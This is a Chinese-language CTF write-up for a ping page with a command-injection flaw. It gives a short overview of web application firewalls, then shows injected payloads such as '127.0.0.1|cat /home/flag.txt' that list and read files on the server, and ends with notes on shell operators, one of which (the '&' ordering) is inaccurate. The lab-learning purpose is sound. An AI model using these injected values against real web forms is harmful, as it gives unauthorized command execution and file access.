WAF:Web应用防护系统，Web应用防火墙是通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护的一款产品。
WAF功能分为4个部分：审计设备，访问控制设备，架构/网络设计工具，WEB应用加固工具
审计设备：对于系统自身安全相关的下列事件产生审计记录：
（1）管理员登录后进行的操作行为；
（2） 对安全策略进行添加、修改、删除等操作行为；
（3） 对管理角色进行增加、删除和属性修改等操作行为；
（4） 对其他安全功能配置参数的设置或更新等行为。
访问控制设备：用来控制对Web应用的访问，既包括主动安全模式也包括被动安全模式。
架构/网络设计工具：当运行在反向代理模式，他们被用来分配职能，集中控制，虚拟基础结构等。
WEB应用加固工具：这些功能增强被保护Web应用的安全性，它不仅能够屏蔽WEB应用固有弱点，而且 能够保护WEB应用编程错误导致的安全隐患。

那这题就是所谓的没有上waf，也就是可以篡改网站。


1、首先ping本地
2、ping本地的同时搜索flag，命令如下：
127.0.0.1 |find / -name “*.txt”
出现以下的信息：
ping -c 3 127.0.0.1|find / -name "*.txt"
/home/flag.txt
/usr/lib/python3.4/idlelib/HISTORY.txt
/usr/lib/python3.4/idlelib/extend.txt
/usr/lib/python3.4/idlelib/TODO.txt
/usr/lib/python3.4/idlelib/README.txt
/usr/lib/python3.4/idlelib/help.txt
/usr/lib/python3.4/idlelib/NEWS.txt
/usr/lib/python3.4/idlelib/CREDITS.txt
/usr/lib/python3.4/LICENSE.txt
/usr/lib/python3.4/lib2to3/PatternGrammar.txt
/usr/lib/python3.4/lib2to3/Grammar.txt
/usr/share/perl/5.18.2/Unicode/Collate/keys.txt
/usr/share/perl/5.18.2/Unicode/Collate/allkeys.txt
/usr/share/perl/5.18.2/unicore/NamedSequences.txt
/usr/share/perl/5.18.2/unicore/SpecialCasing.txt
/usr/share/perl/5.18.2/unicore/Blocks.txt
/usr/share/doc/libdb5.3/build_signature_amd64.txt
/usr/share/doc/gnupg/Upgrading_From_PGP.txt
/usr/share/doc/openssl/HOWTO/keys.txt
/usr/share/doc/openssl/fingerprints.txt
/usr/share/vim/vim74/doc/help.txt

5、使用127.0.0.1|cat /home/flag.txt可得到flag


wp：
 1、| 的作用为将前一个命令的结果传递给后一个命令作为输入
      &&的作用是前一条命令执行成功时，才执行后一条命令


2、掌握有关命令执行的知识windows或linux下:
command1 && command2 先执行command1，如果为真，再执行command2
command1 | command2 只执行command2
command1 & command2 先执行command2后执行command1
command1 || command2 先执行command1，如果为假，再执行command2命令执行漏洞（| || & && 称为管道符）


wp第二条，第七条